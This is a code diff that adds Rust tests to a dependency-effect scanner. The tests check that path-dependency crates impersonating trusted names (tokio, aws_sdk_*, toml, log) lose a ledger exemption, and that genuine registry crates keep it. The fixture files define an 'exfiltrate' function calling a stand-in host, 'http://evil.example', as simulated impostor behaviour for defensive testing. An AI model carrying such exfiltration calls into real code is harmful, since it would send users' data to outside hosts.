@@ -8418,6 +8418,133 @@ pub fn rebound() { let (r, _): (Runner, u32) = make(); let (r, _): (u32, u32) = 
         let _ = std::fs::remove_dir_all(&root);
     }
 
+    /// GUARD-DELETION AUDIT (bin/AGENT-CORPUS-BRIEF.md attack C), 2026-08-30: every test above this one
+    /// proves the impostor carve-out for exactly ONE of the four calibrated-style exemptions —
+    /// `CALIBRATED_CRATES` (via the `log` fixtures). scan.rs's coverage-ledger filter applies the
+    /// identical `&& !impostor` carve-out to THREE MORE, independent list checks:
+    ///
+    ///     !(PATH_CALIBRATED_CRATES.contains(cr) && !impostor)
+    ///     !(CALIBRATED_PREFIXES.iter().any(|p| cr.starts_with(p)) && !impostor)
+    ///     !(REVIEWED_PURE_CRATES.contains(cr) && !impostor)
+    ///
+    /// Each is a SEPARATE boolean conjunct, so a suite that only ever drives an impostor through
+    /// `CALIBRATED_CRATES` cannot tell any of these three apart from a version with `&& !impostor`
+    /// deleted. Confirmed live: deleting all three `!impostor` conjuncts (leaving the bare list checks)
+    /// left `cargo test --workspace` fully green — 0 failures across every crate — before this test
+    /// existed. Each arm below reproduces the `log`-impostor shape one level over, for one crate drawn
+    /// from each list, plus its own over-charge control so the fix can't be "widen to always disclose".
+    #[test]
+    fn path_calibrated_prefix_and_reviewed_pure_impostors_lose_the_ledger_exemption() {
+        let scan = |dir: &std::path::Path| -> serde_json::Value {
+            let idx = DepIndex::default();
+            let (rc, body) = scan_one(&dir.to_string_lossy(), ScanOpts {
+                prefix: String::new(), want_json: true, include_tests: false, policy: None,
+                baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
+            }, &crate::gate::begin_run());
+            assert_eq!(rc, 0, "scan should succeed:\n{body:?}");
+            serde_json::from_str(&body.unwrap()).unwrap()
+        };
+        let assert_disclosed = |v: &serde_json::Value, crate_name: &str, label: &str| {
+            assert!(!v["functions"].as_array().unwrap().is_empty(),
+                "{label}: an impostor `{crate_name}` must not vanish entirely (\"functions\": []):\n{v:#}");
+            assert_eq!(fn_entry(v, "exfiltrate")["invisible"], serde_json::json!([crate_name]),
+                "{label}: an unclassified call into a NON-registry `{crate_name}` must disclose the crate \
+                 as invisible:\n{v:#}");
+            assert!(effs(fn_entry(v, "exfiltrate")).is_empty(),
+                "{label}: NO FABRICATION — the impostor's real effect must never be guessed:\n{v:#}");
+        };
+        let assert_exempt = |v: &serde_json::Value, label: &str| {
+            assert!(v["functions"].as_array().unwrap().is_empty(),
+                "{label}: a genuine registry-sourced dependency must keep the exemption unchanged — the \
+                 over-charge this test must never accept:\n{v:#}");
+        };
+        // One fixture builder shared by all three arms: `crate_name` is a `path` dependency with NO
+        // Cargo.lock (the reproduced-shape, no-lockfile impostor from `non_registry_manifest_names`) for
+        // the defect case, or a bare version for the honest control.
+        let build = |tag: &str, crate_name: &str, manifest_dep: &str| -> std::path::PathBuf {
+            let d = std::env::temp_dir().join(format!("candor-collide4-{tag}-{}", std::process::id()));
+            let _ = std::fs::remove_dir_all(&d);
+            std::fs::create_dir_all(d.join("src")).unwrap();
+            std::fs::write(d.join("Cargo.toml"), format!(
+                "[package]\nname = \"victim\"\nversion = \"0.1.0\"\n[dependencies]\n{crate_name} = {manifest_dep}\n"
+            )).unwrap();
+            std::fs::write(d.join("src/lib.rs"), format!(
+                "pub fn exfiltrate() {{ {crate_name}::totally_unmodelled_tail(\"http://evil.example\"); }}\n"
+            )).unwrap();
+            d
+        };
+
+        // ── PATH_CALIBRATED_CRATES: `tokio` ─────────────────────────────────────────────────────────
+        let d = build("tokio-impostor", "tokio", "{ path = \"../evil-tokio\" }");
+        assert_disclosed(&scan(&d), "tokio", "PATH_CALIBRATED_CRATES impostor (tokio, path dep)");
+        let _ = std::fs::remove_dir_all(&d);
+        let d = build("tokio-honest", "tokio", "\"1\"");
+        assert_exempt(&scan(&d), "PATH_CALIBRATED_CRATES honest control (tokio, bare version)");
+        let _ = std::fs::remove_dir_all(&d);
+
+        // ── CALIBRATED_PREFIXES: a name starting `aws_sdk_` ─────────────────────────────────────────
+        let d = build("awssdk-impostor", "aws_sdk_evilthing", "{ path = \"../evil-aws\" }");
+        assert_disclosed(&scan(&d), "aws_sdk_evilthing", "CALIBRATED_PREFIXES impostor (aws_sdk_*, path dep)");
+        let _ = std::fs::remove_dir_all(&d);
+        let d = build("awssdk-honest", "aws_sdk_evilthing", "\"1\"");
+        assert_exempt(&scan(&d), "CALIBRATED_PREFIXES honest control (aws_sdk_*, bare version)");
+        let _ = std::fs::remove_dir_all(&d);
+
+        // ── REVIEWED_PURE_CRATES: `toml` ────────────────────────────────────────────────────────────
+        let d = build("toml-impostor", "toml", "{ path = \"../evil-toml\" }");
+        assert_disclosed(&scan(&d), "toml", "REVIEWED_PURE_CRATES impostor (toml, path dep)");
+        let _ = std::fs::remove_dir_all(&d);
+        let d = build("toml-honest", "toml", "\"0.8\"");
+        assert_exempt(&scan(&d), "REVIEWED_PURE_CRATES honest control (toml, bare version)");
+        let _ = std::fs::remove_dir_all(&d);
+    }
+
+    /// GUARD-DELETION AUDIT, 2026-08-30: `verified_workspace_root` has TWO ways for `dir` to be entitled
+    /// to a workspace root's `[workspace.dependencies]` table — `dir` IS `root` (a non-virtual manifest,
+    /// declaring BOTH `[package]` and `[workspace]`, resolving its own `{ workspace = true }` dependency
+    /// against its own table — no membership question to ask), or `dir` is one of `root`'s resolved
+    /// MEMBERS. Every existing fixture for this function drives the MEMBER arm only
+    /// (`workspace_inheritance_and_dotted_key_impostors_lose_the_ledger_exemption` scans `member/`, never
+    /// the root). Confirmed live: deleting the `canon_root == canon_dir` early-return (falling through to
+    /// the members-only check, which a non-virtual root fails since `workspace_members` lists its members,
+    /// never itself) left `cargo test --workspace` fully green. Without that branch a non-virtual root's
+    /// OWN honest `{ workspace = true }` dependency loses the exemption it is entitled to — the opposite
+    /// direction from a silent under-report (a false impostor charge on an honest crate), but still a
+    /// correctness property this suite could not see break.
+    #[test]
+    fn a_non_virtual_workspace_root_resolves_workspace_true_against_its_own_table() {
+        let d = std::env::temp_dir().join(format!("candor-collide5-selfroot-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&d);
+        std::fs::create_dir_all(d.join("member/src")).unwrap();
+        std::fs::create_dir_all(d.join("src")).unwrap();
+        // Non-virtual root: BOTH `[package]` (it is scanned as a crate in its own right) AND `[workspace]`
+        // (it also owns the `[workspace.dependencies]` table its own `{ workspace = true }` resolves
+        // against). `log` is genuinely registry-sourced (bare version) — an HONEST case that must keep
+        // the CALIBRATED_CRATES exemption.
+        std::fs::write(d.join("Cargo.toml"),
+            "[package]\nname = \"victim\"\nversion = \"0.1.0\"\n\n[workspace]\nmembers = [\"member\"]\n\n\
+             [workspace.dependencies]\nlog = \"0.4\"\n\n[dependencies]\nlog = { workspace = true }\n"
+        ).unwrap();
+        std::fs::write(d.join("src/lib.rs"),
+            "pub fn exfiltrate() { log::totally_unmodelled_tail(\"http://evil.example\"); }\n"
+        ).unwrap();
+        std::fs::write(d.join("member/Cargo.toml"), "[package]\nname = \"member\"\nversion = \"0.1.0\"\n").unwrap();
+        std::fs::write(d.join("member/src/lib.rs"), "pub fn noop() {}\n").unwrap();
+        let idx = DepIndex::default();
+        let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+            prefix: String::new(), want_json: true, include_tests: false, policy: None,
+            baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
+        }, &crate::gate::begin_run());
+        assert_eq!(rc, 0, "scan should succeed:\n{body:?}");
+        let v: serde_json::Value = serde_json::from_str(&body.unwrap()).unwrap();
+        let _ = std::fs::remove_dir_all(&d);
+        assert!(v["functions"].as_array().unwrap().is_empty(),
+            "a non-virtual workspace ROOT resolving its OWN honest `{{ workspace = true }}` dependency \
+             against its OWN `[workspace.dependencies]` table must keep the CALIBRATED_CRATES exemption — \
+             it is entitled to that table by BEING the root, not by being listed as one of its own \
+             members:\n{v:#}");
+    }
+
     /// R59-CLASS PROBE (the ~79-crate audit `3cb1906`'s own commit message named as still open):
     /// `clap::Arg::env(name)` calls `env::var_os(&name)` DIRECTLY at builder time (clap_builder
     /// 4.6.6, builder/arg.rs:2205-2213) — a real `Env` read, independent of and long before
